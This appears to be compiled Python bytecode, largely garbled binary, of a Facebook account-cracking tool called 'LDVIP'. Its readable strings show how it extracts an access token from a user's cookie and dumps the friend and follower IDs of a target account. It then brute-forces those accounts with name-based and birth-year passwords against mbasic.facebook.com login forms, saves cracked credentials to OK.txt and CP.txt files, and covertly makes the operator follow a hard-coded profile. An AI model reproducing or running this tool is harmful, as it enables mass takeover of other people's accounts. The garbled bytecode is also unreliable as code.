o
    ???b??  ?                   @   s  d Z ddlZddlZddlZddlZddlZddlmZ ddlmZ ddl	m
Z
 ddlmZ e?d? dd	? Zd
ZdZdZdZdZdZdZg g g ZZZg Zdadd? Zdd? Zdd? ZG dd? d?ZG dd? d?ZG dd? de?Z dd? Z!e"dkr?e?d? e!?  dS dS ) z

?    N)?BeautifulSoup)?choice)?ThreadPoolExecutor)?time?clearc                   C   s   t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d	? t ?d
? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d ? t ?d!? t ?d"? t ?d#? t ?d$? t ?d%? t ?d&? t ?d'? t ?d(? t ?d)? t ?d*? t ?d+? t ?d,? t ?d-? t ?d? t ?d.? t ?d/? t ?d0? t ?d1? t ?d2? t ?d3? t ?d4? t ?d5? t ?d6? t ?d7? t ?d8? t ?d9? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d ? t ?d!? t ?d"? t ?d#? t ?d$? t ?d%? t ?d&? t ?d'? t ?d(? t ?d)? t ?d*? t ?d+? t ?d,? t ?d-? t ?d? t ?d.? t ?d/? t ?d0? t ?d1? t ?d2? t ?d3? t ?d4? t ?d5? t ?d6? t ?d7? t ?d8? t ?d9? t ?d:? t ?d;? t ?d<? t ?d=? t ?d>? t ?d?? t ?d?? t ?d@? t ?dA? t ?dB? t ?dC? t ?dD? t ?dE? t ?dF? t ?dF? t ?dG? t ?dH? t ?dI? t ?dJ? t ?dK? t ?dL? t ?dM? t ?dN? t ?dO? t ?dP? t ?dQ? t ?dR? t ?dS? t ?dT? t ?dU? t ?dV? t ?dW? t ?dX? t ?dY? t ?dZ? t ?dZ? t ?d[? t ?d\? t ?d]? t ?d^? t ?d_? t ?d`? t ?da? t ?db? t ?dc? t ?dd? t ?de? t ?df? t ?dg? t ?dh? t ?di? t ?dj? t ?d? t ?dk? t ?dl? t ?dm? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? t ?d? d S )nNzsMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1zmMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)z?Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)zKMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)zdMozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)z9Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)z.Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)z>Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51zFAppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)zqMozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)z?Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)z?Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)z?Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)z?Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)z?Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)zRMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3zjMozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)zmMozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zqMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)z^Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0EzEOpera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15zmMozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57z?Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413zQMozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0z:Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8gz7Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)zkMozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125z~Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)zTMozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413zdMozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)z/Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)zMMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)zHMozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)z<Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)z=Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10zoMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4zJMozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0z?Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10z8Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)z?Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)z?Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)z@Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)z?Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16zSMozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1z?Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)z<Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)z/Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)zUMozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7z\BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0z0Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)z|Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)z^Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)z-Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)zBOpera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10zWMozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)zOMozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007zLBlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179zZMozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620zZMozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.comzJMozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)z!Mozilla/4.0 (compatible; Arachmo)z)Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)zSMozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)zeMozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)z6BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)zGMozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)zBSqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)zCMozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)zSMozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)zUMozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )zhMozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)zeMozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)zYMozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)zWMozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)zjMozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)z?Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)z?Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)zlMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)zqMozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHAz?Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2z?Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1z9Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194Az!Mozilla/5.0 (PLAYSTATION 3; 3.55)z!Mozilla/5.0 (PLAYSTATION 3; 2.00)z!Mozilla/5.0 (PLAYSTATION 3; 1.00)zNMozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0zLMozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)z4SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)z9iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)z3Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)zfMozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)zyMozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) zvMozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)zZMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1z7Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)zEMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)zZMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})zcMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))z.Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)zAMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51zZMozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1znMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)z_Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)zbMozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8zfMozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)zjMozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zmMozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)zXMozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1)Zheaders_useragents?append? r   r   ?!/storage/emulated/0/Download/V.py?useragent_list   sl  




















































































































































































r
   z[0;98mz+[0;96mz;[0;94mzK[0;95mz[[0;93mzk[0;92mz{[0;99mc                 C   sv   d| i}t ?? jdddddddd	d
dd?	|d?}zzt?dt|j???d?}W W |S    d}Y W |S |     Y S )N?cookiez0https://business.facebook.com/business_locationsz?Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.com?1?#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7?	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)	?
user-agent?referer?host?origin?upgrade-insecure-requests?accept-language?cache-control?acceptzcontent-type??headers?cookiesz	(EAAG\w+)?   ?Cookies Invalid)?requests?Session?get?re?search?str?text?group)r   r   ?res?tokenr   r   r	   ?convert?   s(   
?
??r&   c                   C   s   t t? ??d?d S )N?.r   )r!   ?mek?splitr   r   r   r	   ?	real_time?   s   r*   c                 C   sx   t |d?}|?dddi?}dd? |?ddd	d
gi?D ?}t | jd|?d? |d?jd?}|?d?D ]}t?|j? q1tS )N?html.parser?form?method?postc                 S   ?   i | ]}|? d ?|? d??qS ??name?value?r   ??.0?xr   r   r	   ?
<dictcomp>?   ?    zsesi.<locals>.<dictcomp>?input?type?hidden?submitzhttps://m.facebook.com?action)?dataZoption)r   ?find?find_allr.   r   r"   ?opsir   )?sessionr$   ?responser,   r>   ?r?ir   r   r	   ?sesi?   s   
 rF   c                   @   s,   e Zd Zdd? Zedd? ?Zedd? ?ZdS )?Mainc                 K   s*   d|d i|d | _ | _g | _d| _d S )Nr   ?cokir%   ?https://mbasic.facebook.com)rH   r%   ?data_id?mbasic)?self?kwargsr   r   r	   ?__init__?   s   
zMain.__init__c                 C   s@   t jd| j? ?| jd??? }|d |d | _| _| j| jd?S )Nz:https://graph.facebook.com/me?fields=name,id&access_token=?r   r1   ?id)r1   rP   )r   r   r%   rH   ?jsonr1   rP   )rL   rD   r   r   r	   ?get_my_info?   s   zMain.get_my_infoc                 C   s<  z| j }W n ty   t?d? t?d? td? Y nw td|d ? d|d ? d?? td	t ? td
? td?}g d?}||vrNtd? td?}||vsB|dksV|dkr?|dkr_td? ntd? td?}ztj	d|? d| j
? ?| jd??? }|d }td|? ?? W n ty?   td? Y nw |dkr?| jd|? d| j
? ?dd? n| jd|? d| j
? ?dd? | j d S |dkr?t?d? t?d? td| j? ?? d S td? ztd ? td!d"??? D ]	}td#|? ?? q?W n   td$? Y td%d%? ztd&? td'd"??? D ]
}td#|? ?? ?qW d S    td$? Y d S )(N?
data/token?	data/cokiz ! Your token Expired ! z >> Your Account: r1   ?, rP   z << u?  %s
	


 _        ______           _________ _______ 
( \      (  __  \ |\     /|\__   __/(  ____ )
| (      | (  \  )| )   ( |   ) (   | (    )|
| |      | |   ) || |   | |   | |   | (____)|
| |      | |   | |( (   ) )   | |   |  _____)
| |      | |   ) | \ \_/ /    | |   | (      
| (____/\| (__/  )  \   /  ___) (___| )      
(_______/(______/    \_/   \_______/|/       
                                             

[0;34mCREATED BY LDVIP
[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
[0;34m█  [mChaneel:@FFRFF3
[0;34m█  [mGithub2: https://github.com/LDVIP
[0;38m█  [mTELEGRAM:@FFRFF3  @FFRFF3
[0;34m█  [mAUTHOR:IPYTHONI_Mrsajad
[0;34m█  [mVersion : [1;96mV1
[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█z{[1;95m
	[1] = CRACK WITH PUBLIC ID
	[2] = CRACK WITH FOLLOWERS
	[4] = CRACK WITH POST
	[3] = CHECK CP / OK
	[0] Logout
			z  Chooice: )?0r   ?2?3z ! Your Chose Not Found !z  CHOOICE: r   rW   ?
z  PASTE ID TARGET: zhttps://graph.facebook.com/z?fields=name,id&access_token=rO   z  Name: z ! DUMP ERROR ! z-?fields=friends.fields(name,id)&access_token=?friends)?url?chosez-?fields=subscribers.limit(5000)&access_token=Z	followersrV   u   
 √ Logout OK z
CRACK ID STARTED..... z >> HACKED results :z/sdcard/.txtrD   z > z  Results 0 ? z  NotHacked results :?/sdcard/CP.txt)rR   ?KeyError?os?remove?exit?print?BMr9   r   r   r%   rH   rQ   ?dumpAccount?validater1   ?open?	readlines)rL   ?infor\   Znumber_listZaccount_targetrD   ?target_namer6   r   r   r	   ?Menu  sl   
????	?"?&
???z	Main.MenuN)?__name__?
__module__?__qualname__rN   ?propertyrR   rk   r   r   r   r	   rG   ?   s    
rG   c                   @   s   e Zd Zdd? ZdS )?Crackc                 C   s  t ?? }|D ?]?}t|j|? d|? d?i dd?dd?dd?d	d
?dd?dd?dd?dd?dd?dd?dd?dd?dd?dd?dd?d d!?d"?jd#?}d$d%? |?d&d'd(i??d)d*d+d,gi?D ?}|?|d-d.d/?t	? |?d0?? |j
|? d1?|i dd?dd?d2d3?dd?d	d
?dd?dd?dd?d4d5?d6d7?dd8?dd?dd?dd?dd?dd?dd9|? d??d:d!d;??d<? d=|j?? v ?rt?|d> | ? td?d@??|d> | dA ? dB?dCdD? |j?? ?? D ??}| ?|? tj?dEt||tt?dF?t?tf ? tj??   n?dG|j?? v ?r?t?|d> | ? tdHd@??|d> | dA ? ddddIddJdJd
dddK?
}	|jdL|	d"?j}
t|
d#?}|?d&d'd(i?}dMd%? |?d)dNdOdPgi?D ?}|?||dQ?? |j
d5|?dR? ||	d<?j}
t|
d#?}dSt|?dT?j?v ?r?tdUd@??dV||f ? tj?dEt||tt?dF?t?tf ? tj??  n?tt||
??dWk?r?dXt|?dT?j?v ?r?tj?dYt||tf ? tj??  ntj?dZt||tt?dF?t?tf ? tj??  t? ?   ntj?d[tt!?tt"?tt?tt?f ? tj??  qt!?d\? d S )]Nz"/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdr?Host?mbasic.facebook.com?
Connectionz
keep-alivezCache-Controlr   ?	sec-ch-uaz)" Not A;Brand";v="99", "Chromium";v="101"zsec-ch-ua-mobilez?1zsec-ch-ua-platformz	"Android"zUpgrade-Insecure-Requestsr   z
User-AgentzGMozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5?Acceptz?text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zSec-Fetch-Sitezsame-originzSec-Fetch-ModeZnavigatezSec-Fetch-UserzSec-Fetch-DestZdocument?Refererz/https://mbasic.facebook.com/login/device-based/?Accept-Encodingzgzip, deflate?Accept-Language?id-ID,id;q=0.9)r   r+   c                 S   r/   r0   r3   )r5   ?_r   r   r	   r7   i  r8   zCrack.crack.<locals>.<dictcomp>r,   r-   r.   r9   r1   ZlsdZjazoestz.https://mbasic.facebook.com/login/save-device/Zlogin_no_pinz#PWD_BROWSER:0:{}:{})?uid?nextZflowZencpassz&/login/device-based/validate-password/zContent-LengthZ142?OriginrI   zContent-Typez!application/x-www-form-urlencodedz{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z=https://mbasic.facebook.com/login/device-based/password/?uid=zgzip, deflate, br)rw   rx   )r>   r   Zc_user?|z/sdcard/OK.txt?arY   ?;c                 S   s   g | ]
\}}d ||f ?qS )z%s=%sr   )r5   ?k?vr   r   r	   ?
<listcomp>?  s    zCrack.crack.<locals>.<listcomp>z.
%s[SUCCESSFUL]
  ID: %s
  Pass: %s
  %s%s
%srU   ZCPr^   r   zhttps://www.facebook.com)
r   r   zaccept-encodingr   r   r   r   rt   r   r   z:https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8c                 S   r/   r0   r3   r4   r   r   r	   r7   ?  r8   r:   r<   r;   )?email?passr=   z.Lihat detail login yang ditampilkan. Ini Anda??titleZuaz%s|%sr   r]   z 
%s
[CP] ID: %s
  Pass: %s
 
%sz&
%s[CP]
  ID: %s
  Pass: %s
  %s%s
%sz+[1;97m[LD] %s/%s[1;92mOK|[1;91mCP:%s/%sZmemek)#r   r   r   r   r"   r?   ZfindAll?update?formatr*   r.   r   ?get_dict?okr   rg   ?write?join?items?	follow_me?sys?stdout?K?lenrA   ?P?flush?cpr@   r!   rF   ?Mr   ?looprJ   )rL   ?userZpassword_listr[   rB   ?pwrD   r>   rH   Zh2r$   Zressr,   Zdata2r   r   r	   ?crackT  s?   
????????	?
????????*??????????	?
?????????
&
?
?
&
?&
(zCrack.crackN)rl   rm   rn   r?   r   r   r   r	   rp   R  s    rp   c                   @   s4   e Zd Zedd? ?Zedd? ?Zdd? Zdd? Zd	S )
?Assetsc                 C   s   t d?}td? |?d?S )Nz Add pass: r]   ?,)r9   rc   r)   )rL   Z	_passwordr   r   r	   ?_password_split?  s   
zAssets._password_splitc           	      C   s0  t d?}|dkr| j}td? td? td? tdd???p}| jD ?]b}|?? }|?d?\}}|?d	?}t|d
 ?dkr?g |?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d  ?|d
 d! ?|d
 d" ?|d
 d# ?|d
 d$ ?|d
 d% ?|d
 d& ?|d
 d' ?|d
 d( ?|d
 d) ?}?nzt|d
 ?d*k?r?g |?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d  ?|d
 d! ?|d
 d" ?|d
 d# ?|d
 d$ ?|d
 d% ?|d
 d& ?|d
 d' ?|d
 d( ?|d
 d) ?}n?g |?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d ?|d
 d  ?|d
 d! ?|d
 d" ?|d
 d# ?|d
 d$ ?|d
 d% ?|d
 d& ?|d
 d' ?|d
 d( ?|d
 d) ?}|dk?ry|| }|?t	? j
||| j? q!W d   ? d S 1 ?s?w   Y  d S )+Nz [y/n] AUTO PASSWORD? ?yz4[1;91m CRACK IS STARTING PLEASE WAIT 15min _ 30min
z$[1;92m Save OK ==>>  /sdcard/OK.txtz#[1;91m Save CP ==>> /sdacrd/CP.txt?#   )Zmax_workers?><? r   ?   Z123Z1234Z12345Z11223344?12Z123123Z	123456789Z12345678Z123321Z
1122334455Z12341234Z1990Z1991Z1992Z1993Z1994Z1995Z1996Z1997Z1998Z1999?2000Z2001Z2002Z2003Z2004Z2005Z2006Z2007Z2008?   )r9   r?   rc   r   rJ   ?lowerr)   r?   r<   rp   r?   rK   )	rL   ?addZpasZkirimr6   ZnameerP   r1   Z_Assets__password_listr   r   r	   rf   ?  s4   ?
?v ?t ?r 
?$?zAssets.validatec              	   K   s?   |d dkrt j|d ? | jd??? d }nt j|d ? | jd??? d }|d D ]}z| j?|d d |d	  ? W q) tyD   Y q)w | jatd
t| j?? ?? | j	 d S )Nr\   rZ   r[   rO   Zsubscribersr>   r1   r?   rP   z
  All Id: )
r   r   rH   rQ   rJ   r   r_   rc   r?   rf   )rL   Zlatif_gantengrD   r6   r   r   r	   re   ?  s     ??
zAssets.dumpAccountc                 C   s?   t ?? ?<}t|j| j? d?ddd?d|id?jd?jdd	d
?}|r8|j| j? |?d? d|id?W  d   ? S W d   ? d S 1 sCw   Y  d S )Nz/latif.harkat.176rr   ry   )r   r   r   r   r+   r   ZIkuti)?stringZhrefrO   )r   r   r   r   rK   r"   r?   )rL   rH   rB   Z_linkr   r   r	   r?   ?  s   
4?"?zAssets.follow_meN)rl   rm   rn   ro   r?   rf   re   r?   r   r   r   r	   r?   ?  s    

r?   c               	   C   s?   zt dd??? } t dd??? }t| |d?j W d S  tyc   zt?d? W n   Y td? td?}t	|?} | dkr?t
d	? t dd
??| ? t dd
??|? t| |d?}|j |?|? |j Y d S w )NrS   rD   rT   )r%   rH   r>   a?  

 _        ______           _________ _______ 
( \      (  __  \ |\     /|\__   __/(  ____ )
| (      | (  \  )| )   ( |   ) (   | (    )|
| |      | |   ) || |   | |   | |   | (____)|
| |      | |   | |( (   ) )   | |   |  _____)
| |      | |   ) | \ \_/ /    | |   | (      
| (____/\| (__/  )  \   /  ___) (___| )      
(_______/(______/    \_/   \_______/|/       
                                             

                                           
                                           

